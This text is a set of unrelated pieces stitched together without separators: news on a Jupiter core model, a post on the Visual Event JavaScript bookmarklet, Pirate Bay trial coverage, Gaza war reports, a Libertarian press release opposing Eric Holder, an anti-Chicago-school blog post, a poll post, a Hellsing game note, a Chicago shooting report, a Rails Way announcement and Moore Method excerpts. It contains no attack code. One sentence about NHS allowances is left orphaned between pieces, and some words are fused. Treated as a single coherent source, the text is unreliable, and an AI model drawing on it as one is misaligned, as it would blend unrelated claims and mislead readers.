Burkhard Militzer , an assistant professor of astronomy and earth and planetary science at Cal , simulated conditions inside the planet on the scale of individual hydrogen and helium atoms .
The simulation predicted the properties of hydrogen and helium for temperature , density and pressure at the surface , all the way to the planet 's center .
The technique is often used to study semi-conductors , according to a UC Berkeley statement on the discovery .
Militzer 's partner , William B. Hubbard , from the University of Arizona , used the data to build the new model for Jupiter 's interior .
A comparison of the model with the planet 's current known mass , radius , surface temperature , gravity and equatorial bulge implies that Jupiter 's core is an Earth - like rock 14 to 18 times the mass of Earth , or about one - twentieth of Jupiter 's total mass , Militzer said .
Previous models predicted a much smaller core of only 7 Earth masses , or no core at all .
Jupiter , like many planets its size already discovered throughout the galaxy , is believed to be a failed star .
Most of the planet 's mass is made up of gas .
The results were published Nov. 20 in Astrophysical Journal Letters .
The simulation suggests that the core is made of layers of metals , rocks and ices of methane , ammonia and water , while above it is an atmosphere of mostly hydrogen and helium .
At the center of the rocky core is probably a metallic ball of iron and nickel , just like Earth 's core , scientists said .
" Our simulations show there is a big rocky object in the center surrounded by an ice layer and hardly any ice elsewhere in the planet , " Militzer said .
" This is a very different result for the interior structure of Jupiter than other recent models , which predict a relatively small or hardly any core and a mixture of ices throughout the atmosphere . "
" Basically , Jupiter 's interior resembles that of Saturn , with a Neptune or Uranus at the center , " he said .
Neptune and Uranus have been called " ice giants " because they also appear to have a rocky core surrounded by icy hydrogen and helium , but without the gas envelope of Jupiter and Saturn .
" This new calculation by Burkhard removes a lot of the old uncertainties of the 19 - year - old model we have had until now , " Hubbard said .
" The new thermodynamic model is a more precise physical description of what 's going on inside Jupiter . "
Scientists said the large , rocky core implies that as Jupiter and other giant gas planets formed 4.5 billion years ago , they grew through the collision of small rocks .
The rocks formed cores that captured a huge atmosphere of hydrogen and helium .
" According to the core accretion model , as the original planetary nebula cooled , planetesimals collided and stuck together in a runaway effect that formed planet cores , " Militzer said .
" If true , this implies that the planets have large cores , which is what the simulation predicts .
It is more difficult to make a planet with a small core . "
In order to match the observed gravity of Jupiter , Militzer 's simulation also predicts that different parts of Jupiter 's interior rotate at different rates .
Jupiter can be thought of as a series of concentric cylinders rotating around the planet 's spin axis , with the outer cylinders - the equatorial regions - rotating faster than the inner cylinders .
This is identical to the sun 's rotation , Militzer said .
How They Did It …
Militzer modeled Jupiter 's interior as a collection of 110 hydrogen and nine helium atoms in a tiny cube that is replicated throughout the planet , a common approximation in " density functional theory . "
The ratio of hydrogen to helium atoms approximates the ratio measured on the surface of Jupiter .
Each simulation took from one to seven days on parallel computing clusters .
Based on this simulation , under the high pressure and temperature deep within the planet , hydrogen changes from a molecular to a metallic state , which provides good electrical conductivity and gives rise to Jupiter 's magnetic field .
This transition happens gradually , contrary to earlier models that predict a sharp transition .
The new model of Jupiter predicts that most of the ices are concentrated in the outer layer of the core , while only a small amount is mixed in the hydrogen - helium gas envelope that contains 95 percent of the planet 's mass .
The " planetary ices " in the envelope amount to about four Earth masses , or 1 percent of Jupiter 's mass , Militzer said .
" The simulation was in pretty good agreement with what the Galileo probe measured " when the NASA spacecraft descended through Jupiter 's atmosphere in 1995 , Hubbard said .
Militzer plans to use the new model to simulate other planets ' interiors , and to investigate the implications for the formation of planets outside our solar system .
Future data from NASA 's Juno mission , to be launched in 2011 , orbit Jupiter by 2016 and measure the planet 's magnetic field and gravity , will provide a check on Militzer 's predictions .
Hubbard is one of the mission 's co-investigators .

Events in Javascript are often seen as a bit of an enigma .
This is odd given that Javascript is very much an event driven language , but it is typically down to their complex nature and difficulty to debug .
To this end I 've createdto help track events which are subscribed to DOM nodes .
Introduction
When working with events in Javascript , it is often easy to lose track of what events are subscribed where .
This is particularly true if you are using a large number of events , which is typical in a modern interface employing progressive enhancement .
Javascript libraries also add another degree of complexity to listeners from a technical point of view , while from a developers point of view they of course can make life much easier !
But when things go wrong it can be difficult to trace down why this might be .
It is due to this I 've put together a Javascript bookmarklet called Visual Event which visually shows the elements on a page that have events subscribed to them , what those events are and the function that the event would run when triggered .
This is primarily intended to assist debugging , but it can also be very interesting and informative to see the subscribed events on other pages .
Usage
Using Visual Event on any web - page is extremely simple :
Drag the Visual Event link below to your bookmark bar :
link below to your bookmark bar : Load a web - page which uses one of the supported Javascript libraries
Click Visual
Event in your bookmark bar
in your bookmark bar View the event handlers which are attached to the document elements .
You can see a demo of this in action showing the events attached by my own DataTables jQuery plugin .
Visual Event is currently beta level software and as such there are a few important notes to make .
This first of these is that Visual Event will not currently work in Internet Explorer .
IE has it 's own events model and I 've concentrated initially on the W3C model .
The second point is that only events added by libraries which Visual Event recognises will actually be shown ( see later for why ) .
The currently supported libraries are :
DOM 0 events
j Query 1.2.x +
YUI 2.6.x ( 2.x might work ! )
MooTools 1.2.x
Prototype 1.6.x
JAK ( Events 2.2 )
Glow
When using Visual Event you will notice that I 've used colour coding and icons to represent different actions in a concise and easy to view manner .
The background colours which show that an element has an event attached to it follow the mapping shown below .
Colour Meaning Blue Mouse event Red UI event ( keys etc ) Yellow HTML event ( select etc ) Purple Mouse + UI events Orange UI + HTML events Green Mouse + HTML events Black Mouse + UI + HTML events
The icons representing individual events also follow this colouring pattern , but also indicate what the attached event is pictorially .
The follows the mapping shown below .
Icon Event click dblclick mousedown mousemove mouseout mouseover mouseup change focus blur select submit keydown keypress keyup load unload custom / unknown
Technical information
It turns out that there is no standard method provided by the W3C recommended DOM interface to find out what event listeners are attached to a particular node .
While this may appear to be an oversight , there was a proposal to include a property called ' eventListenerList ' ( reference ) to the level 3 DOM specification , but this has unfortunately been removed in the latest drafts .
As such we are forced to looked at the individual Javascript libraries , which typically maintain a cache of attached events ( so they can later be removed and perform other useful abstractions ) .
In the current version of Visual Event I have included support for jQuery , YUI , MooTools , Prototype ( many thanks to John Schulz for his advice in adding Prototype support ) and JAK ( with thanks to Michal Aichiner for providing an API function ) .
I 've investigated including information Dojo , however this library does not appear not to cache the information that is required by visual event .
If anyone does know of a way - please get in touch !
I would strongly encourage developers who use some of the other libraries to get in touch with me , and submit a function which can be used by Visual Event to parse a specific library 's cache .
The following structure must be returned by the function :
// Return code from event cache parsing function [ { //
Node which is in question " nNode " : -, //
The name of the library where the event comes from ( e.g. ' YUI ' ) " sSource " : '' , // Array of the listeners attached to this node " aListeners " : [ { //
Type of event ( e.g. ' click ' ) " sType " : '' , // String of the function to run ( from Function.toString ( ) ) " sFunction " : '' , // Indicate if the event has been removed by the library - typically false " bRemoved " : '' } , ... ] } , ... ]
Alternatively , you can make use of a global variable which Visual Event will recognise .
This global variable is called VisualEvents which you can populate using either the structure given above , or the slightly simpler version below ( ideal for putting into an event registration function ) - or any combination of the two :
[ { //
Node which is in question " nNode " : -, //
The name of the library where the event comes from ( e.g. ' YUI ' ) " sSource " : '' , // Type of event ( e.g. ' click ' ) " sType " : '' , // String of the function to run ( from Function.toString ( ) ) " sFunction " : '' , // Indicate if the event has been removed by the library - typically false " bRemoved " : '' } , ... ]
Future work
There is quite a lot which could be done with Visual Event in order to improve it and make it more useful for developers .
The following is my current list ( and in no particular order ! ) :
Support for Internet Explorer
Add parsers for other Javascript libraries
Improve the UI look and feel
IIf you have any other ideas , or if you are interested in helping me develop Visual Event further , please do n't hesitate to get in touch !
Day 4 of The Pirate Bay trial has seen the focus on Fredrik who was questioned at length .
When it was movie industry lawyer Monique Wadsted 's turn , she wasted no time in unexpectedly introducing new evidence .
Both the defense and the court complained at this point , with Wadsted choosing to shout down the judge .
Prosecutor Håkan Roswall began the day by again referencing the case in Finland against the administrators of Finreactor .
Fredrik ’s lawyer Jonas Nilsson requested a copy of the case notes for the defense .
It seems comparisons of the two cases will be drawn by the prosecution later in the trial .
Carl Lundström ’s lawyer Per E Samuelsson continued with his client ’s defense , reiterating the weakness of the links between him and the other defendants , and The Pirate Bay operation as a whole .
Samuelsson also pointed to Lundström ’s email correspondence in 2005 with Gottfrid and Fredrik , where they discussed the possibility of having to move the site to another country .
This , he said , was an indication that the defendants kept an eye on the changes in the law and were mindful that they should operate legally within it .
In the meantime , it came to the court ’s attention that Tobias Andersson , a future witness in the case , was sitting in the court .
He was asked to leave the room , with permission to continue listening on the audio feed next door .
He will testify later on .
After a break , the court ’s attention switched to Fredrik Neij ( TiAMO ) .
The court heard that Fredrik was never a member of Piratbyran and he had no ideological motivation to join TPB .
Instead , Fredrik was attracted to the site by the BitTorrent technology .
He joined to “ .. play with The Pirate Bay , just as I wanted , ” he said .
The defense said that Fredrik was always mindful of the law and had a desire to operate within it , consulting lawyers to ensure his activities were legal .
In a reference to companies like MediaDefender , Fredrik noted that “ anti - p2 p companies access our tracker and manipulate our statistics . ”
He said that although a torrent may have only been uploaded once , these anti-p2p activities inflate the stats on the tracker to indicate that more transfers took place than in reality .
Fredrik was then questioned about his relationship with advertiser Oded Daniel .
When the prosecution asked if Oded was involved in the technical aspects of TPB , Fredrik replied ..
“ No , he ’s not good at that .
He uses Windows , so … ”
There was laughter heard on the live audio feed after that remark , not from the court room , but from the listening lounge next door where the bloggers are situated .
Fredrik was asked about the significance of the site ’s name , but shrugged and repeated that his interest is merely in the technology .
Fredrik was further questioned by Håkan Roswall , with the Prosecutor pointing out that during his police interview , Fredrik admitted that there may be links to copyright works on TPB .
Fredrik said he knew about these due to the legal complaints the site received , noting that the complaints referred only to inapplicable US laws .
He went on to deny having received any of these personally , but while he admitted he seen them , he denied creating any of the infamous responses .
Roswall asked Fredrik if he had ever been a seeder on the site .
Fredrik admitted to seeding torrents but noted that he only did this with copyright - free material .
When questioned about the situation of some torrents being removed from the site due to bad labeling , the court heard from the defense that TPB site is uncensored , with thousands of new torrents added every day and it is an impossible task to review them all .
The tracker is completely open and anyone can and does add to it regularly , completely without any input or correspondence with TPB staff .
Just before lunch , Monique Wadsted for the movie companies took over questioning Fredrik .
After a discussion over the way emails are handled at The Pirate Bay , out of the blue she began to introduce new evidence which had not previously been disclosed to the defense , in what is being viewed as an attempt to unsettle Fredrik .
She asked about Fredrik ’s connections to other torrent sites , namely OscarTorrents and EurovisionTorrents and he denied being personally connected to them .
Noting the breach of protocol , the judge asked if it was acceptable for the court to be considering evidence that was not already presented pre-trial .
Monique Wadsted tried to shout down the judge , but that did n’t really help much .
The court then took a break .
After the lunch break IFPI ’s lawyer Peter Danowsky continued with Fredrik ’s questioning .
He tried to pin something on him , but Fredrik pointed out that the email he ’s referring to is a reply , and that the quotes mean that he did n’t write that part of the email .
Fredrik ’s lawyer is next up to ask questions , and the prosecution was educated on the subject of open BitTorrent trackers , BitTorrent swarms and the fact that torrent files can be distributed through means other than the TPB , like email or FTP .
Then the Prosecutor handed over a printed page from TPB and said : “ This is a printout from a part of your web page .
You call this a screenshot ? ”
Fredrik answered : “ This is n’t a screenshot , just a printed page . ”
Fredrik then explains what ’s on the print ( a Pink Panther torrent ) , and how the upload process on TPB works .
Next it ’s Gottfrid ’s turn to answer questions .
The prosecution emphasizes the financial issues , and specifically the link with Oded .
When asked if Gottfrid was in charge of ad sales he answered : “ No , I tried to get away from that because of time issues .
I had a business to run before you came and took it all away . ”
The prosecution further questioned Gottfrid about moderation issues , replies to copyright holders and his involvement in developing the site .
The prosecutor pushed hard on whether Peter Sunde had worked on the layout and graphics for the site .
“ To my knowledge , he is neither designer nor graphic artist , ” Gottfried replied .
Wadsted later asked Gottfrid how they handle torrents that ( allegedly ) link to child porn .
He said that in such a case they would inform the police .
She then asked if they removed those torrents .
He said “ some ” .
“ Not all ? ” was Wadsted ’s reply .
Gottfrid explained that it is not up to them to investigate crimes , but that they do inform the police .
“ We ca n’t do investigations of our own .
And if the police say we should remove a torrent , we will , ” he said .
Gottfrid further said that Peter Sunde has nothing to do with technical administration , design , layout , ad sales or any hands - on stuff with the site .
He ’s just been a spokesperson for The Pirate Bay .
“ Neither me or Neij work well in furnished rooms .
Peter was better on the verbal issues and media , ” he said .
Around 4 PM the Prosecutor announced that he wanted to bring in additional evidence , some actual torrent files on a diskette ( he probably meant CD ) .
The Prosecutor demanded a statement on it at 9 in the morning tomorrow .
The defense was n’t too happy about this , and Gottfrid demanded all torrents instead of four .
Update : Just a passing thought ….. While Wadsted may have thought she was being clever mentioning possible child porn tracked by The Pirate Bay earlier , it ’s not beyond reason that when Gottfrid said that they do n’t remove all such torrents , this could be on the instruction of the police – presumably so they can track any offenders .
In this situation , the police must understand that Pirate Bay neither committed any offense , nor encouraged it , nor know the people involved .
Is there something important here ?
I guess the court will decide .

The secretary general of the United Nations has called for a full investigation into Israel 's shelling of three of its buildings in the Gaza Strip during its three - week long assault against Hamas .
A visibly furious Ban Ki-moon condemned as " outrageous , shocking and alarming " the destruction he had seen while touring Gaza , and described as " excessive use " of force the violence wrought by both Israel and Hamas rockets .
" These are heartbreaking scenes I have seen and I am deeply grieved by what I have seen today , " he said , standing against a backdrop of still - smoking food aid in a UN warehouse destroyed by Israeli gunfire last Thursday .
Demanding a proper judicial inquiry and guarantees that UN buildings would not be attacked again , Ban said : " I am just appalled .
I am not able to describe how I am feeling , having seen this site of the bombing of the United Nations compound .
This was an outrageous and totally unacceptable attack against the United Nations . "
An aide to Ban said he had come to Gaza to express solidarity with the Palestinians who had suffered during the 22 - day Israeli assault .
Ban 's comments follow furious remarks delivered by senior officials of the UN Relief and Works Agency ( UNRWA ) at the weekend when two children were killed by Israeli shellfire at a school where hundreds of people were taking refuge .
Officials then called for an inquiry into " possible war crimes " .
During the conflict Israeli shells hit the UN headquarters in Gaza as well as two UN schools , killing nearly 40 people near one of the schools in the worst incident .
Although the Israeli military announced on Saturday that it would launch an inquiry at the " highest level " into the five most controversial incidents where civilians were killed – including the targeting of UN buildings – it appeared to have pre-judged that inquiry by adding that initial Israeli Defence Force ( IDF ) investigations had shown hostile fire was coming from or near all five locations before they were hit .
Ban 's comments came as Israel 's foreign minister and leader of the Kadima party , Tzipi Livni , made clear that Israel would only consider acceding to a UN security council resolution demanding a full lifting of the economic blockade on Gaza – in force for a year and a half – when Hamas released Corporal Gilad Schalit , who has been in captivity since 2006 .
" He is an IDF soldier , " the foreign minister said during a speech in Rishon Lezion .
" We sent him to defend the country and we have an obligation to bring him back .
" If Hamas thinks it wants to get something beyond humanitarian assistance , which we will give regardless , we have someone who is very important to us , and , for me ; one thing is contingent upon the other . "
Earlier today thousands of Hamas supporters gathered for what the Islamist group 's leaders described as a victory rally in a square outside the remains of the parliament building in Gaza City , which was heavily damaged in an Israeli air strike .
Two men hoisted a sign in Hebrew reading : " The resistance will be victorious , Israel has been defeated " .
Financial estimates of the full cost of the Israeli bombardment of Gaza reflect the scale of the destruction : the Palestinian Central Bureau of Statistics put total property damage at $ 1.9bn ( £ 1.3bn ) .
The UN 's humanitarian chief , John Holmes , speaking in New York , said the organisation 's staff in Gaza were trying " to find out as much as they can about how great the damage is and how great the needs are " .
He said : " On the purely humanitarian and early recovery side … it will be hundreds of million of dollars and no doubt the overall reconstruction costs will be numbered in billions of dollars , but I would n't want to put a figure on it beyond that . "
Saudi Arabia has already pledged $ 1bn towards repairing the damage .
European Union foreign ministers are due to meet in Brussels shortly to discuss humanitarian aid and Israeli demands for the prevention of weapons smuggling into Gaza .
More than 1,300 Palestinians were killed in Israel 's attacks , which Israel said were intended to halt cross - border rocket attacks and destroy Hamas 's military infrastructure .
Hamas has said 5,000 homes , 16 government buildings and 20 mosques were destroyed and 20,000 houses were damaged in the assault ; Israel claimed militants hid weapons inside the mosques .
Palestinian militant groups said 112 of their fighters and 180 Hamas policemen were killed .
Israel put its dead at 10 soldiers and said three civilians were killed in rocket attacks .
Medical officials have confirmed that 700 Palestinian civilians were killed , and that figure is likely to rise as survivors return to search through the rubble of their shattered homes .
As many as 400,000 Gazans have been left without running water .
Israel , which accused Hamas of endangering non-combatants by operating in densely populated areas , alleged that hundreds of militant Hamas fighters were among the dead .
In Geneva the director general of the World Health Organisation , Margaret Chan , warned of a looming health crisis among the 1.5 million Gazans .
She said she was " deeply concerned " about the interruption of immunisations and other life - saving care , and the limited availability of hospital beds in Gaza .
Last night an Israeli man was shot and seriously injured while driving near the Kochav Hashachar settlement in the West Bank .
The previously unheard of al - Bashair army claimed responsibility for the attack .
Top officials at bodies including the NHS , the Qualifications and Curriculum Authority and Transport for London have all been quietly receiving the allowance , which is meant to meet rent payments and other costs , despite some not having to relocate before taking up their posts .
For Immediate Release
Attorney General nominee hostile to Second Amendment rights
WASHINGTON , D.C. — America ’s third - largest political party urged the Senate Wednesday to reject the nomination of Eric Holder to be Attorney General , citing his record of hostility to Second Amendment rights .
‘ The Attorney General is expected to defend our Constitutional rights , not infringe them , ’ said Libertarian Party spokesman Donny Ferguson , ‘ Americans value the precious rights protected by the Second Amendment , and they demand the Senate reject this nomination . ’
Nominated by President Barack Obama to lead the Justice Department , Holder earned the ire of gun rights groups while Deputy Attorney General under then - President Bill Clinton , from 1997 to 2000 .
Holder supported mandatory licensing and registration of gun owners , banning certain types of legal ammunition , waiting periods for handgun purchases , restricting law - abiding gun owners to purchase only one gun a month and regulations intended to drive gun shows out of existence .
Holder was also a key figure in a 2000 attempt by the Clinton administration to sue several firearms manufacturers who did not agree to restrict certain lawful sales , despite the fact Congress earlier rejected such proposed rules .
The companies were told the government lawsuits would be dropped if they agreed to restrict certain sales to lawful purchasers and stop manufacturing certain types of legal firearms .
Only one , Smith & Wesson , agreed .
Holder also sided against gun rights in the Supreme Court ’s 2008 District of Columbia v. Heller case seeking to overturn Washington , D.C. ’s gun control laws .
In a brief , Holder argued the Second Amendment confers collective rights on the government and does not protect individual rights of Americans .
The Court ruled otherwise , declaring gun ownership to be an individual right .

JERUSALEM ( Reuters ) - Israeli Prime Minister Ehud Olmert on Thursday issued a “ last - minute ” appeal to Palestinians in the Gaza Strip to reject their Hamas rulers and stop rocket fire at Israel , warning them he would not hesitate to use force .

His comments were the clearest indication yet that Israel was preparing a possible Gaza offensive which could result in heavy casualties on both sides and fuel a humanitarian crisis .
Israeli political sources said Olmert ’s security cabinet approved a “ staged ” military escalation , beginning with air strikes against a wider range of Hamas targets in the densely - populated enclave .
A large - scale operation has yet to be authorized but could get a green light depending on Hamas ’s response , the sources said .
In Gaza , Hamas spokesman Fawzi Barhoum said Israel would “ pay the price ” for any attack .
Olmert told Al Arabiya television , an Arab broadcaster widely watched in Gaza : “ I did n’t come here to declare war . ”
“ But Hamas must be stopped -- that is the way it is going to be .
I will not hesitate to use Israel ’s might to strike Hamas and ( Islamic ) Jihad .
How ?
I will not go into details now , ” Olmert said , according to a statement issued by his office .
Olmert has resisted calls within Israel for a major military operation against Hamas , but rocket and mortar fire from the coastal enclave since a six - month truce brokered by Egypt expired last week has increased pressure on him to act .
Israeli Foreign Minister Tzipi Livni , a leading candidate to replace Olmert in a February 10 election , held emergency talks with Egyptian President Hosni Mubarak , in Cairo , who cautioned against an escalation .
ROCKET FIRE “ UNBEARABLE ”
Livni said Hamas had to pay for “ unbearable ” rocket fire , declaring : “ Enough is enough . ”
Adding to the saber - rattling , army chief Gabi Ashkenazi said Israel would have to act with “ all our force to hurt the terrorist infrastructure and change the security reality . ”
In a sign any fighting with Gaza ran the risk of igniting a wider war , Lebanese troops dismantled eight rockets set up for launch at Israel in a border village .
Israel fought an inconclusive war with Hezbollah guerrillas in Lebanon in 2006 .
Egypt appealed to Hamas leaders after the talks with Livni “ to calm the situation so as to avoid an Israeli military escalation , ” a Palestinian official said in Gaza .
In response to world appeals and a reduction in rocket fire from Gaza , Israel agreed later to let about 100 trucks carrying food , humanitarian aid , grain and animal feed travel into Gaza on Friday through two crossings , officials on both sides said .
Israel has tried to weaken Islamist Hamas by keeping the Gaza Strip ’s border crossings closed , increasing hardship for the territory ’s 1.5 million residents .
But there is little doubt that Hamas has control and can counter internal challenges .
Since the ceasefire ended on Friday , more than 200 rockets and mortar shells have been fired at Israel , causing damage but few injuries , the Israeli army said .
In the same period , six Gaza militants have been killed in Israeli attacks .
But rocket fire from Gaza declined to 16 launches on Thursday , from dozens the day before .
In the Al Arabiya interview , Olmert issued what amounted to a public call to Gazans to overthrow their Hamas leaders to prevent an escalation with Israel .
“ I ’m telling them now .
It may be the last minute .
I ’m telling them .
Stop it .
We are stronger .
There will be more blood there .
Who wants it ?
We do n’t want it , ” Olmert said .
Olmert questioned whether Hamas ’s stance was consistent with Islam .
“ Is the spirit of Islam to kill innocent children , to fire rockets at kindergartens and civilians ?
I do n’t think that is the spirit of Islam , ” Olmert said .

Why I Choose contribution !
Some time ago , I asked if “ Milton Friedman was the next economist whose once lauded reputation may soon slide ? ”
Turns out it happened much quicker than expected .
A long Bloomberg piece , Friedman Would Be Roiled as Chicago Disciples Rue Repudiation , discusses the tarnishment of the Chicago school of thought .
Its long overdue .
From the efficient - market theories , to the concept of man as rational profit maximizers , much of the edifice that is was the Chicago school of economics is based on a foundation that is false , disproven or otherwise questionable .
I first encountered the Chicago theory in law school .
The Chicagoists somehow read into law a market efficiency component that was never there .
I recoiled against it — not because of the libertarianism , which I embraced .
Rather , it seemed a backdoor way to circumvent democracy , and force into the legal system rules that were never debated , voted on , or agreed to by a representative government .
I found the extremist legal theories of Judges like Richard Posner and Frank Easterbrook intellectually repulsive .
They were undemocratic , anti-representative government .
When I told a professor that the law and economics movement was an attempt at a political coup , he laughed and said , try to stop it .
I disliked the neoclassical price theory .
It was authoritarian , a worship of a form of mob rule outside of the usual legal channels .
The view that regulation and other government intervention is always inefficient compared to a free market has now been made laughable .
Its always the extremists that seem to control a discipline or school of thought .
If I have any dogma , its extremism in all forms is undesirable ( I know , radical , huh )
If there is one silver lining in the entire collapse , its that this group of intellectual charlatans have been revealed as utterly wanting .
Oh , there will be some pushback by the Chicagoans .
( Watch the comments for the cute little protests from law students who never practiced a day in their lives , and the biz school kiddies who never executed a single trade ) .
Anyway , here ’s an excerpt from today ’s Bloomberg :
“ When Friedman ’s Platonic ideas of free - market virtues are put into practice , they have too often generated a systemic orgy of competitive greed — whose remedies , ironically , entail countermeasures of nationalization , ” Marshall Sahlins , an emeritus professor of anthropology , said during the debate , speaking in a room adorned with murals of female students parading through the campus in medieval gowns .
Sahlins , 77 , noted a few weeks later socialist and capitalist countries alike are regulating or nationalizing financial institutions in a rebuff to Friedman .
Off campus , the global meltdown is stirring anti-Chicago economists , who were voices in the wilderness during decades of lax government oversight of markets .
Joseph Stiglitz , who won one of Columbia ’s economics Nobels , says the approach of Friedman and his followers helped cause today ’s turmoil .
‘ Bears the Blame ’ “ The Chicago School bears the blame for providing a seeming intellectual foundation for the idea that markets are self - adjusting and the best role for government is to do nothing , ” says Stiglitz , 65 , who received his Nobel in 2001 .
University of Texas economist James Galbraith says Friedman ’s ideology has run its course .
He says hands - off policies were convenient for American capitalists after World War II as they vied with government - favored labor unions at home and Soviet expansion overseas .
“ The inability of Friedman ’s successors to say anything useful about what ’s happening in financial markets today means their influence is finished , ” he says .
Instead , Galbraith , 56 , says policy - makers are rediscovering the ideas of his father , Harvard professor John Kenneth Galbraith , and economist John Maynard Keynes of the University of Cambridge .
Keynes , who died in 1946 , argued that governments should spend to combat the unemployment that free markets tolerate .
Galbraith , who died in 2006 , rejected mathematical models and technical analyses as divorced from reality . ”
That ’s the phrase that best sums up the Chicago School : “ Divorced from Reality . ”
Chicago School repudiation ?
Good riddance !

Good news for liberty buffs : Americans do n't trust the feds
A recent Public Strategies Inc. / Politico poll shows that Americans do n't trust the federal government , and their level of trust continues to decline .
According to Politico :
A majority of voters say their confidence in the federal government ’s ability is falling , according to a new Public Strategies Inc. / Politico poll [ PDF ] .
Sixty - two percent of respondents say their confidence in Washington has decreased over the past 12 months , while only 8 percent said their confidence has increased .
Less than a third of those polled said their confidence in the federal government remained the same .
Glenn Reynolds ( a.k.a. Instapundit ) wonders when the " Obama effect " will kick in .
Surely , surely , Americans will trust the feds just as soon as Mr. Hope & Change gets sworn in .
Surely .
( Interestingly , the poll found that only 35 per cent of Americans thought that " things in government are headed in the right direction , " with 65 per cent thinking things are on " the wrong track . " )
While I could n't find a recent poll on Canadians ' attitudes towards the feds , I did find this 2005 Trudeau Foundation poll showing that we are also mistrustful of our political ruling class .
Only 27 per cent trusted the feds to do what was right always or most of the time ( that number , of course , is ridiculously high .
Trust the feds to do what 's right ?
Did they include Kindergarteners in the poll ? )
Of course , if you , dear reader , find a more recent poll on our trust in the federal government , please pass it under my nose so I can update this post .

This is nothing new nor surprising .
Traditionally and historically Americans have always tended to be suspicious of government as opposed to Canadians .
We have tended to be more conservative than Americans ( historically at least ) and have tended to be more willing to trust government .
Americans on a whole have tended to be more independently - minded .

Vampire Hunter ?
Yeah , I know .
Technically it 's true , and since " Leader of Hellsing " would have been too redundant and " Protestant Knight " too vague , I opted for the simplest and most " Van Helsing " of options -- Vampire Hunter .
As a character , Integra 's greatest strength lays in her ability to lead , and the fact that her special ability allows her player to combine the abilities of multiple investigators to overcome obstacles , monsters and tests really speaks to that .
Plus , how often do you see Integra go into the field without Alucard or Walter at her side ?
It 's in her nature to be badass by commanding those who are even more badass than she is , begging the question : " Who is more badass ?
The badass , or the badasses who follow her ? "
She starts out at the Police Station , probably after being briefed on the situation by local law enforcement -- it fits her character , and harkens back to the briefing we see at the beginning of Hellsing 's pacification of the vampire in Cheddar village early on in the series .
As confident and experienced as she is , I feel she 's earned a Sanity of 6 , a high Will skill , and a high Lore skill .
Plus , despite a stamina of 3 , she 's still one of the toughest broads around -- definitely tough enough to be carrying around a monster trophy right from the start .
CHICAGO , Illinois ( CNN ) --
Five people were shot Friday outside a Chicago , Illinois , high school , police said .
Police say a shooting outside a Chicago high school on Friday may be gang - related .
Authorities said the shooting occurred about 8 p.m. CT outside Dunbar High School on Chicago 's South Side .
" It appears to be gang - related , " Chicago Police Superintendent Jody Weis said at a news conference , adding that more than 200 officers were investigating the incident .
" We anticipate solving this thing in the not too distant future , " Weis said .
Chicago Fire Department spokeswoman Eve Rodriguez said the five people -- all males -- were wounded by gunfire and taken to area hospitals .
Two were in serious condition , one was in critical condition and two were in stable condition , she said .
Rodriguez also said a female victim was injured in a fall and was listed in good condition at a hospital .
Rodriguez told CNN affiliate WGN that all of the victims were " young people , " but she could not say whether they were students .
WGN reported that a basketball game was in double overtime at the school when shots were fired outside the building .
Basketball games had been underway at the school for about four hours , and some students were leaving the building when gunfire broke out , WGN reported .
Shaneisha Turman , 15 , told WGN that she was standing in the doorway of the gym when she saw a silver truck pull up to a nearby bus stop .
The occupants of the truck pretended to shoot , Turman said , and then " they really started shooting . "
People were shouting " They 're shooting , " Turman said , adding , " It was a lot of people shouting and running . "
Weis said security cameras at the school were being examined to aid in the investigation and while no arrests had been made , " We 've got some positive leads . "

The Rails Way Returns
Back in the days of Rails 1.x , one of the most influential Rails websites was The Rails Way that was run by Rails core team members Jamis Buck and Michael Koziarski .
The purpose of the site was to help teach early Rails developers " best practices " in Rails development and did so through code reviews and refactorings of code that were submitted to the site .
The site was very influential in helping to push the skinny controller design as well as highlighting many common bad practices .
Unfortunately the site has n't been updated since October of 2007 , that was , until several mornings ago when Michael Koziarski announcing that he is " finally ready to bring The Rails Way back from hibernation " .
It looks like it will only be Michael writing on the site but in addition to code reviews he states that he plans to add other posts such as :
I ’ll be doing some focussed introductory pieces which cover the best practices for a few tricky areas that I see experienced rails programmers getting wrong .
I ’ll also be doing a few ‘ soapboxy ’ pieces where I can address misinformation about Rails and Ruby or just advocate a particular piece of technology or code that I think is really cool .
So if you have some code that you would n't mind having reviewed in public or you just want to learn from other peoples mistakes - this is a site to keep an eye on .
The first post from the relaunch is Requests Per Second where Koz takes a long at the concept of using " requests per second " as a metric for the benchmarking of your Rails applications .
Support from : acts_as_conference - A two day Rails conference in Orlando , Florida on February 6 and 7 .
Only $ 125 , free food , a great venue , and lots of top Rails speakers including DHH .

Moore Method
“ Since the roots of the problems described above run so deep , it is imperative that potential solutions ( such as the Moore method ) be implemented early in students ’ careers — and not just for students planning to become mathematicians ” ( p. 686 ) .
This film features interviews with Moore and shows him in the classroom .
It is the only attempt he made to publicize his teaching method .
This is a sample reel , prepared by George Paul Csicsery , for a proposed new video on Dr. Moore and the Moore Method .
It includes excerpts from interviews with mathematician Paul Halmos and theologian James W. McClendon .
" Today 's world needs creative minds and in India the need for such minds is desperate .
We should experiment with any method which has a promise of enabling the students to face unfamiliar situations with confidence .
The world is so dynamic today that mastery of facts has become secondary to mastery of techniques of acquiring knowledge . "
Kapur was a professor at Indian Institute of Technology , Kanpur , and Vice - Chancellor of Meerut University .
" The 1999 interview with Paul Halmos ( 1916 - 2006 ) that forms the backbone of I Want To Be A Mathematician was initiated to gather some comments from Halmos about R.L. Moore for the Educational Advancement Foundation ’s R.L Moore Legacy Project . "
" I will not , I told them , lecture to you ....
They stared at me , bewildered and upset -- perhaps even hostile .
...
They suspected that I was trying to get away with something , that I was trying to get out of the work I was paid to do .
I told them about R.L. Moore , and they liked that , that was interesting .
Then I gave them the basic definitions they needed to understand the statements of the first two or three theorems , and said ' class dismissed ' .
It worked . "
More than twenty - five influential teachers , top researchers , inventors , and leaders of industry attest to the life changing rewards that began for them in a classroom taught by IBL and the Moore Method .
" [ I ] mplementation of the Common Core State Standards for geometry cannot be successful until our teachers themselves gain a modern mastery of the subject that is consistent with these standards . "
A seminar course for junior - senior mathematics majors is described .
The topic is continued fractions , taught by a modified Moore Method , where the focus is on students creating their own mathematics .
" What might be viewed as highly suspect ( if not downright immoral and debilitating ) in the light of present - day prizing of cooperative learning , was a life - enhancing source for an unusually large number of students .
In fact , R.L. Moore single - handedly turned out this century 's leading set - theoretic topologists . " ( p. 42 ) The author was a student of E.E. Moise ( Moore PhD , 1947 ) at the Harvard Graduate School of Education .
" ... many mathematicians , including those who criticize constructivism , revere R. L. Moore as an outstanding teacher of mathematics ....
The goal of this article is to show that Moore 's method aligned with a constructivist approach . "
Course Resources
